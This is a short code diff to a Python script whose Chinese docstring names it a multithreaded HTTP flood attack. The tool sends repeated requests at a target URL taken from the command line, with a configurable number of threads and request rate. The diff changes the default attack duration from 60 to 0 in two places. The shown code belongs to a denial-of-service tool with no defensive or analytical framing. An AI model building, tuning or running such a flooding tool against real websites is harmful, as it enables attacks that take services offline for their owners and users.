@@ -84,7 +84,7 @@ def http_flood_thread(target_url, thread_id, requests_per_second=10, duration=60
     print(f"\nThread {thread_id} finished.")
 
 
-def http_flood(target_url, num_threads=10, requests_per_second=10, duration=60):
+def http_flood(target_url, num_threads=10, requests_per_second=10, duration=0):
     """
     多线程 HTTP Flood 攻击
     :param target_url: 目标 URL
@@ -141,6 +141,6 @@ if __name__ == "__main__":
     target_url = sys.argv[1]
     num_threads = int(sys.argv[2]) if len(sys.argv) > 2 else 10
     req_per_sec = int(sys.argv[3]) if len(sys.argv) > 3 else 10
-    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
+    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 0
     
     http_flood(target_url, num_threads, req_per_sec, duration)
